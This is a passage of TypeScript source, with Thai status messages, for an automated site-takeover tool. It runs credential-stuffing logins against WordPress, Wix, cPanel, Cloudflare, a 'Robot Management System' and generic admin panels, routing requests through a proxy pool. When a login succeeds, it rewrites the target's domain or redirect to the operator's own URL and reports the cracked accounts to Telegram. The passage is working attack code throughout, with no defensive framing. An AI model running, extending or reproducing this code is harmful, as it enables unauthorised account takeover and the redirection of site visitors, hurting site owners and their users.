    targetSite = siteList.sites[0];
  }
  
  if (!targetSite) {
    onProgress?.("rms_notarget", `❌ No suitable site found to update`);
    return results;
  }
  
  // Step 5: Update domain to redirect
  onProgress?.("rms_update", `🎯 Updating ${targetSite.domain} → redirect to ${ourRedirectUrl.substring(0, 50)}...`);
  
  // Extract our domain from redirect URL for the domain update
  let ourDomain: string;
  try {
    ourDomain = new URL(ourRedirectUrl).hostname;
  } catch {
    ourDomain = ourRedirectUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  }
  
  const updateResult = await rmsUpdateDomain(
    session,
    targetSite.id,
    targetSite.domain,
    ourDomain,
    true, // enable redirect_old_domain
  );
  
  if (updateResult.success) {
    onProgress?.("rms_success", `🎯🎯🎯 RMS DOMAIN UPDATED!\n   ${targetSite.domain} → ${ourDomain}\n   redirect_old_domain: enabled`);
    
    // Update the last result to include the redirect URL
    const loginResult = results.find(r => r.success && r.accessType === "rms_admin");
    if (loginResult) {
      loginResult.newRedirectUrl = ourRedirectUrl;
      loginResult.detail += ` | Domain updated: ${targetSite.domain} → ${ourDomain}`;
    }
  } else {
    onProgress?.("rms_update_failed", `❌ Domain update failed: ${updateResult.detail}`);
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  MAIN EXECUTOR
// ═══════════════════════════════════════════════════════

export async function executeTakeoverVectors(config: TakeoverExecutionConfig): Promise<TakeoverExecutionResult> {
  const startTime = Date.now();
  const {
    intelResult,
    maxVectors = 3,
    maxCredsPerVector = 15,
    maxDurationMs = 120_000,
    onProgress,
    onAttempt,
  } = config;
  
  // Get our redirect URL
  const ourRedirectUrl = config.ourRedirectUrl || await pickRedirectUrl();
  
  const allAttempts: TakeoverAttemptResult[] = [];
  const successfulLogins: TakeoverAttemptResult[] = [];
  let redirectChanged = false;
  let newRedirectUrl: string | null = null;
  let vectorsAttempted = 0;
  
  // Sort vectors by success probability (highest first)
  const sortedVectors = [...intelResult.takeoverVectors]
    .sort((a, b) => b.successProbability - a.successProbability)
    .slice(0, maxVectors);
  
  if (sortedVectors.length === 0) {
    return {
      totalAttempts: 0,
      successfulLogins: [],
      redirectChanged: false,
      newRedirectUrl: null,
      vectorsAttempted: 0,
      totalDurationMs: Date.now() - startTime,
      summary: "ไม่มี takeover vector ให้ execute",
      attempts: [],
    };
  }
  
  onProgress?.("execute", `🎯 กำลัง execute ${sortedVectors.length} vectors (redirect → ${ourRedirectUrl.substring(0, 50)})`);
  
  for (const vector of sortedVectors) {
    // Check timeout
    if (Date.now() - startTime > maxDurationMs) {
      onProgress?.("timeout", `⏱️ Timeout (${(maxDurationMs / 1000).toFixed(0)}s) — หยุด execute`);
      break;
    }
    
    vectorsAttempted++;
    onProgress?.("vector", `\n📌 Vector ${vectorsAttempted}/${sortedVectors.length}: ${vector.name} (~${vector.successProbability}%)`);
    
    let attempts: TakeoverAttemptResult[] = [];
    
    // Route to appropriate handler based on vector type
    if (vector.id.startsWith("short_url_takeover_")) {
      attempts = await executeShortUrlTakeover(vector, ourRedirectUrl, maxCredsPerVector, onAttempt);
    } else if (vector.id === "platform_takeover_wordpress") {
      attempts = await tryWordPressLogin(
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.id === "platform_takeover_wix") {
      attempts = await tryWixLogin(
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.id === "cpanel_takeover" || vector.id.includes("cpanel")) {
      attempts = await tryCpanelLogin(
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.id === "cloudflare_takeover" || vector.id.includes("cloudflare") || vector.id.includes("dns_takeover")) {
      // Extract target path from the redirect chain if available
      const targetPath = intelResult.redirectChain?.find(r => r.url?.includes(intelResult.domain))?.url?.replace(/^https?:\/\/[^/]+/, "") || undefined;
      attempts = await tryCloudflareTakeover(
        intelResult.domain,
        targetPath,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        ourRedirectUrl,
        onAttempt,
        onProgress,
      );
    } else if (vector.id === "rms_takeover" || vector.id.includes("robot_management") || vector.id.includes("rms")) {
      // Robot Management System takeover
      // Extract target host from redirect chain destination or domain
      const rmsTargetHost = intelResult.redirectChain?.find(r => 
        r.url && !r.url.includes(intelResult.domain)
      )?.url?.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "") || intelResult.domain;
      attempts = await tryRobotManagementTakeover(
        rmsTargetHost,
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        ourRedirectUrl,
        onAttempt,
        onProgress,
      );
    } else if (vector.method === "credential_stuffing") {
      // Generic credential stuffing for unknown platforms
      attempts = await tryGenericLogin(
        intelResult.domain,
        vector,
        maxCredsPerVector,
        onAttempt,
      );
    }
    
    allAttempts.push(...attempts);
    
    // Check for successes
    const loginSuccesses = attempts.filter(a => a.success);
    successfulLogins.push(...loginSuccesses);
    
    // Check if redirect was changed
    const redirectSuccess = attempts.find(a => a.newRedirectUrl);
    if (redirectSuccess) {
      redirectChanged = true;
      newRedirectUrl = redirectSuccess.newRedirectUrl!;
      onProgress?.("success", `\n🎯🎯🎯 REDIRECT TAKEOVER SUCCESS!\n   ${vector.name}: ${redirectSuccess.email}\n   New URL: ${newRedirectUrl}`);
      break; // Mission accomplished!
    }
    
    // Report vector result
    if (loginSuccesses.length > 0) {
      onProgress?.("partial", `🔓 ${loginSuccesses.length} login(s) succeeded but redirect not changed yet`);
    } else {
      onProgress?.("failed", `❌ Vector failed: 0/${attempts.length} logins succeeded`);
    }
  }
  
  const totalDurationMs = Date.now() - startTime;
  
  // Build summary
  const summaryParts: string[] = [];
  summaryParts.push(`Vectors: ${vectorsAttempted}/${sortedVectors.length}`);
  summaryParts.push(`Attempts: ${allAttempts.length}`);
  summaryParts.push(`Logins: ${successfulLogins.length}`);
  if (redirectChanged) {
    summaryParts.push(`🎯 REDIRECT CHANGED → ${newRedirectUrl}`);
  }
  summaryParts.push(`Time: ${(totalDurationMs / 1000).toFixed(1)}s`);
  
  return {
    totalAttempts: allAttempts.length,
    successfulLogins,
    redirectChanged,
    newRedirectUrl,
    vectorsAttempted,
    totalDurationMs,
    summary: summaryParts.join(" | "),
    attempts: allAttempts,
  };
}

// ═══════════════════════════════════════════════════════
//  GENERIC LOGIN HANDLER
// ═══════════════════════════════════════════════════════

async function tryGenericLogin(
  domain: string,
  vector: TakeoverVector,
  maxCreds: number,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  const credsToTry = vector.credentialsToTry.slice(0, maxCreds);
  
  // Try common admin panel paths
  const adminPaths = [
    "/wp-login.php",
    "/wp-admin/",
    "/admin/",
    "/administrator/",
    "/login",
    "/user/login",
    "/account/login",
  ];
  
  // Find which admin path exists
  let adminUrl: string | null = null;
  for (const path of adminPaths) {
    try {
      const { response } = await fetchWithPoolProxy(`http://${domain}${path}`, {
        redirect: "follow",
      }, { timeout: 8000 });
      
      const body = await response.text().catch(() => "");
      if (response.status === 200 && (body.includes("login") || body.includes("password") || body.includes("username"))) {
        adminUrl = `http://${domain}${path}`;
        break;
      }
    } catch {}
  }
  
  if (!adminUrl) {
    return [{ vectorId: vector.id, vectorName: vector.name, email: "", password: "", success: false, detail: "No admin panel found", durationMs: 0 }];
  }
  
  for (const cred of credsToTry) {
    const start = Date.now();
    onAttempt?.(vector.id, cred.email, "trying", `Generic: ${cred.email}@${adminUrl}`);
    
    try {
      const { response } = await fetchWithPoolProxy(adminUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `username=${encodeURIComponent(cred.email)}&password=${encodeURIComponent(cred.password)}&log=${encodeURIComponent(cred.email)}&pwd=${encodeURIComponent(cred.password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = response.status;
      const location = response.headers.get("location") || "";
      
      // Success indicators
      if ((status === 302 || status === 301) && !location.includes("login") && !location.includes("error")) {
        results.push({
          vectorId: vector.id,
          vectorName: vector.name,
          email: cred.email,
          password: cred.password,
          success: true,
          detail: `Login successful → ${location.substring(0, 60)}`,
          accessType: "admin_panel",
          durationMs: Date.now() - start,
        });
        onAttempt?.(vector.id, cred.email, "success", `✅ Login: ${cred.email}`);
        return results;
      }
      
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Failed (${status})`,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ Error`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM FORMATTER
// ═══════════════════════════════════════════════════════

export function formatTakeoverExecutionForTelegram(result: TakeoverExecutionResult): string {
  let msg = "";
  
  if (result.redirectChanged) {
    msg += `🎯🎯🎯 REDIRECT TAKEOVER SUCCESS!\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `✅ Redirect เปลี่ยนเป็น: ${result.newRedirectUrl}\n\n`;
    
    const successAttempt = result.attempts.find(a => a.newRedirectUrl);
    if (successAttempt) {
      msg += `🔑 Account: ${successAttempt.email}\n`;
      msg += `🔓 Access: ${successAttempt.accessType}\n`;
      msg += `📌 Vector: ${successAttempt.vectorName}\n`;
      
      // RMS-specific details
      if (successAttempt.accessType === "rms_admin") {
        msg += `🤖 Method: Robot Management System\n`;
        msg += `   JWT token + domain update + redirect_old_domain\n`;
      }
    }
  } else if (result.successfulLogins.length > 0) {
    msg += `🔓 LOGIN SUCCESS (${result.successfulLogins.length} accounts)\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `⚠️ Login สำเร็จแต่ยังเปลี่ยน redirect ไม่ได้\n\n`;
    
    for (const login of result.successfulLogins.slice(0, 5)) {
      msg += `   🔑 ${login.email} (${login.accessType})\n`;
      msg += `      ${login.detail.substring(0, 60)}\n`;
    }
  } else {
    msg += `❌ Takeover Execution: ไม่สำเร็จ\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  }
  
  msg += `\n📊 Stats:\n`;
  msg += `   Vectors tried: ${result.vectorsAttempted}\n`;
  msg += `   Total attempts: ${result.totalAttempts}\n`;
  msg += `   Successful logins: ${result.successfulLogins.length}\n`;
  msg += `   Duration: ${(result.totalDurationMs / 1000).toFixed(1)}s\n`;
  
  // Show failed attempts summary
  const failedAttempts = result.attempts.filter(a => !a.success);
  if (failedAttempts.length > 0 && failedAttempts.length <= 10) {
    msg += `\n❌ Failed attempts:\n`;
    for (const a of failedAttempts.slice(0, 8)) {
      msg += `   • ${a.email}: ${a.detail.substring(0, 50)}\n`;
    }
    if (failedAttempts.length > 8) {
      msg += `   ... +${failedAttempts.length - 8} more\n`;
    }
  }
  
  return msg;
}

// ═══════════════════════════════════════════════════════
//  UTILITIES
// ═══════════════════════════════════════════════════════

function extractShortCode(target: string, service: string): string | null {
  // Extract short code from URL like "https://t.ly/pgw828" → "pgw828"
  try {
    const url = target.startsWith("http") ? target : `https://${target}`;
    const parsed = new URL(url);
    const path = parsed.pathname.replace(/^\//, "").replace(/\/$/, "");
    if (path) return path;
  } catch {}
  
  // Try regex extraction
  const regex = new RegExp(`${service.replace(".", "\\.")}[/]([a-zA-Z0-9_-]+)`, "i");
  const match = target.match(regex);
  return match?.[1] || null;
}

function escapeXml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}
